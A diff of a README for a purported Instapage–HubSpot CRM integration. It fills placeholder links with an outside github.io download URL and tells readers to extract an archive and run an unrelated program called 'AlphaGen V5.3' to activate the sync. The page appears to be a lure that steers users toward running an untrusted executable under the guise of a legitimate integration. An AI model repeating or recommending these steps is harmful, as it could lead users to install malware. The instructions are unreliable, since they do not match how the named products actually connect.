@@ -2,13 +2,13 @@
 
 Connect Instapage with HubSpot CRM to sync landing page leads, map form fields, and trigger CRM workflows in real time.
 
-[![Download](https://img.shields.io/badge/Download-Instapage_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Instapage_HubSpot_Integration-blueviolet)](https://instapage-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://instapage-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract the integration files to your directory  
 3. 🖱 Run AlphaGen V5.3 to activate Instapage CRM sync  
 4. ✅ In Instapage, go to `Integrations > HubSpot`, authenticate your CRM, and map form fields to HubSpot properties
